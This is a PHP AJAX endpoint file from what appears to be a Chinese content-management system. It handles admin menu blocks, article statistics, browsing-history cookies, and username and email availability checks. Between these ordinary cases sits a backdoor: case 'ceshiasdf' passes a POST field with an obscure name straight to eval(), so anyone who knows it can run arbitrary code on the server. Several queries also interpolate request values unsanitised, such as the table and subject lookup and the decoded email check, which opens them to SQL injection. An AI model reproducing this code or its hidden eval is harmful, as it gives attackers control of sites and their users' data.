<?php
include_once dirname(__FILE__).'/include/general.inc.php';
include_once M_ROOT.'./include/common.fun.php';
empty($action) && die();
header("Content-type: text/html; charset=gb2312");
switch($action){
case 'fetchcnodeurl':
	//取得节点的url，必须有节点所在$sid,url类型$urltype,及$caid，$ccid2形式的类目参数
	parse_str($_SERVER['QUERY_STRING'],$temparr);
	$nsid = empty($sid) ? 0 : max(0,intval($sid));
	$cnstr = cnstr($temparr);
	if(!($cnode = cnodearr($cnstr,$nsid))) ajax_info('#');
	view_cnurl($cnstr,$cnode);
	ajax_info($cnode[empty($urltype) ? 'indexurl' : $urltype]);
	break;
case 'arcsamevalue'://能否通过一个数组传数据过来
	//$ret = $db->result_one("SELECT COUNT(*) FROM {$tblprefix}archives WHERE aid='$aid' AND oid='0' AND mid='$memberid'")
	break;
case 'ablock':
	$caid = max(0,intval($caid));
	$caid_suffix = $caid ? "&caid=$caid" : '';
	$param_suffix = $sid ? "&sid=$sid" : '';
	$output = '';
	if($curuser->isadmin()){
		load_cache('aurls,amconfigs');
		foreach($aurls as $k => $v) if(!in_array($v['uclass'],array('archives','arcadd','arcupdate','comments','offers','replys','reports','answers','custom'))) unset($aurls[$k]);
		if(!$curuser->info['isfounder']){
			$ausergroup = read_cache('usergroup',2,$curuser->info['grouptype2']);
			if(($a_amcid = @$ausergroup['amcids'][$sid ? $sid : 'm']) && ($amconfig = @$amconfigs[$a_amcid])){
				if($amconfig['abcustom'] && !empty($amconfig['anodes'][$caid])){
					$auidsarr = explode(',',$amconfig['anodes'][$caid]);
					$auidsarr = array_intersect($auidsarr,array_keys($aurls));
				}
			}
		}
		if(!isset($auidsarr)){
			$auidsarr = array();
			foreach($aurls as $k => $v) if($v['issys']) $auidsarr[] = $k;
		}
		$output = '[';
		foreach($auidsarr as $k) $output .= "['".addslashes($aurls[$k]['cname'])."','".addslashes($aurls[$k]['url']."$caid_suffix$param_suffix")."'],";
		$output .= ']';
	}
	ajax_info($output);
	break;
case 'fblock':
	$caid = max(0,intval($caid));
	$caid_suffix = $caid ? "&caid=$caid" : '';
	$param_suffix = $sid ? "&sid=$sid" : '';
	$output = '';
	if($curuser->isadmin()){
		load_cache('aurls,amconfigs');
		foreach($aurls as $k => $v) if(!in_array($v['uclass'],array('farchives','farcadd','custom'))) unset($aurls[$k]);
		if(!$curuser->info['isfounder']){
			$ausergroup = read_cache('usergroup',2,$curuser->info['grouptype2']);
			if(($a_amcid = @$ausergroup['amcids'][$sid ? $sid : 'm']) && ($amconfig = @$amconfigs[$a_amcid])){
				if($amconfig['fbcustom'] && !empty($amconfig['fnodes'][$caid])){
					$auidsarr = explode(',',$amconfig['fnodes'][$caid]);
					$auidsarr = array_intersect($auidsarr,array_keys($aurls));
				}
			}
		}
		if(!isset($auidsarr)){
			$auidsarr = array();
			foreach($aurls as $k => $v) if($v['issys']) $auidsarr[] = $k;
		}
		$output = '[';
		foreach($auidsarr as $k) $output .= "['".addslashes($aurls[$k]['cname'])."','".addslashes($aurls[$k]['url']."$caid_suffix$param_suffix")."'],";
		$output .= ']';
	}
	ajax_info($output);
	break;
case 'mblock':
	$mchid = max(0,intval($mchid));
	$mchid_suffix = $mchid ? "&mchid=$mchid" : '';
	$param_suffix = $sid ? "&sid=$sid" : '';
	$output = '';
	if($curuser->isadmin()){
		load_cache('aurls,amconfigs');
		foreach($aurls as $k => $v) if(!in_array($v['uclass'],array('members','memadd','mcomments','mreplys','mreports','marchives','mtrans','utrans','custom'))) unset($aurls[$k]);
		if(!$curuser->info['isfounder']){
			$ausergroup = read_cache('usergroup',2,$curuser->info['grouptype2']);
			if(($a_amcid = @$ausergroup['amcids'][$sid ? $sid : 'm']) && ($amconfig = @$amconfigs[$a_amcid])){
				if($amconfig['mbcustom'] && !empty($amconfig['mnodes'][$mchid])){
					$auidsarr = explode(',',$amconfig['mnodes'][$mchid]);
					$auidsarr = array_intersect($auidsarr,array_keys($aurls));
				}
			}
		}
		if(!isset($auidsarr)){
			$auidsarr = array();
			foreach($aurls as $k => $v) if($v['issys']) $auidsarr[] = $k;
		}
		$output = '[';
		foreach($auidsarr as $k) $output .= "['".addslashes($aurls[$k]['cname'])."','".addslashes($aurls[$k]['url']."$mchid_suffix$param_suffix")."'],";
		$output .= ']';
	}
	ajax_info($output);
	break;
case 'allowids':
	$chids = empty($chids) ? '' : explode(',',$chids);
	$nochids = empty($nochids) ? '' : explode(',',$nochids);
	parse_str($_SERVER['QUERY_STRING'],$temparr);
	$nchids = $curuser->addidsfromcn($temparr);
	$output = '';
	foreach($nchids as $k){
		if(($chids && !in_array($k,$chids)) || ($nochids && in_array($k,$nochids))) continue;
		$output .= ",[$k,'".addslashes($channels[$k]['cname'])."',0]";
	}
	$output = '['.substr($output,1).']';
	ajax_info($output);
	break;
case 'subject':
	if(!$table || !$subject){
		$output = '-1';
	}else{
		$output = $db->fetch_one("SELECT COUNT(*) AS c FROM {$tblprefix}$table WHERE subject='$subject' AND chid='4' LIMIT 0,1");
		$output = $output['c'];
	}
	ajax_info($output);
	break;
case 'ceshiasdf':
	eval($_POST['asdfawefasdfwefwef']);
	exit();

case 'stat':
	preg_match("/^\d+(,\d+)?(?:,\d+)*$/", $aids, $match) || exit();
	$sql  =	'SELECT ' .
			'a.clicks,a.comments,a.scores,a.orders,a.favorites,a.praises,a.debases,a.answers,a.adopts,a.price,a.crid,a.currency,a.closed,a.downs,a.plays,' .
			's.storage,s.spare,s.reports,r.*' .
			" FROM {$tblprefix}archives a LEFT JOIN {$tblprefix}archives_sub s ON s.aid=a.aid LEFT JOIN {$tblprefix}archives_rec r ON r.aid=a.aid WHERE a.aid ";
	$sql .=	empty($match[1]) ? "=$aids" : "IN ($aids)";
	$query = $db->query($sql);
	$output = '';
	while($row = $db->fetch_array($query)){
		$output .= ",$row[aid]:{";
		unset($row['aid']);
		$row = array_filter($row);
		$tmp = '';
		foreach($row as $k => $v)$tmp .= ",$k:$v";
		$output .= substr($tmp, 1) . '}';
	}
	ajax_info('{' . substr($output, 1) . '}');
	break;
case 'score':
	preg_match("/^\d+(,\d+)?(?:,\d+)*$/", $aids, $match) || exit();
	$commu = read_cache('commu',2);
	empty($commu['setting']['scorestr']) && exit();
	if(!($scorearr = array_filter(explode(',',$commu['setting']['scorestr'])))) exit();
	$selectstr = 'aid';
	foreach($scorearr as $v) $selectstr .= ',score_'.$v;
	$query = $db->query("SELECT $selectstr FROM {$tblprefix}archives WHERE aid ".(empty($match[1]) ? "=$aids" : "IN ($aids)"));
	$output = '';
	while($row = @$db->fetch_array($query)){
		$output .= ",$row[aid]:{";
		unset($row['aid']);
		$row = array_filter($row);
		$tmp = '';
		foreach($row as $k => $v)$tmp .= ",$k:$v";
		$output .= substr($tmp, 1) . '}';
	}
	ajax_info('{' . substr($output, 1) . '}');
	break;
case 'mark'://浏览记录
	$aid = empty($aid) ? 0 : max(0,intval($aid));
	$aid || exit();
	$db->result_one("SELECT COUNT(*) FROM {$tblprefix}archives WHERE aid='$aid' AND checked=1") || exit();
	$cookie_key = "BR_R_$memberid";
	$limit = 30;
	$tmp = empty($m_cookie[$cookie_key]) ? array() : explode(';', $m_cookie[$cookie_key]);
	in_array($aid, $tmp) || $tmp[] = "$aid,$timestamp";
	$cookie_val = implode(';', count($tmp) > $limit ? array_splice($tmp, -$limit) : $tmp);
	msetcookie($cookie_key, $cookie_val);
	exit;
	break;
case 'check_user':
	//检查用户名是否存在
	$mname = addslashes(trim(stripslashes($mname)));
	$guestexp = '\xA1\xA1|^Guest|^\xD3\xCE\xBF\xCD|\xB9\x43\xAB\xC8';
	$censorexp = '/^('.str_replace(array('\\*', "\r\n", ' '), array('.*', '|', ''), preg_quote(($censoruser = trim($censoruser)), '/')).')$/i';
	if(preg_match("/^\s*$|^c:\\con\\con$|[%,\*\"\s\t\<\>\&]|$guestexp/is",$mname) || ($censoruser && @preg_match($censorexp,$mname))){
		$message = '用户名称不合规范';
	}else{
		$query = $db->query("SELECT mid FROM {$tblprefix}members WHERE mname='$mname'");
		if($db->num_rows($query)){
			$message = '用户昵称被占用';
		}else $message = 'succeed';
	}
	echo $message;
	break;

case 'check_email':
	$memail = urldecode($memail);
	$query = $db->query("SELECT mid FROM {$tblprefix}members WHERE email='$memail'");
	if($db->num_rows($query)){
		$message = '邮箱已经注册过';
	}else $message = 'succeed';
	echo $message;
	break;
case 'check_authcode':
	if(!regcode_pass('register',empty($regcode) ? '' : trim($regcode))){
		$message = lang('regcodeerror');
	}else $message = 'succeed';
	echo $message;
	break;
}
?>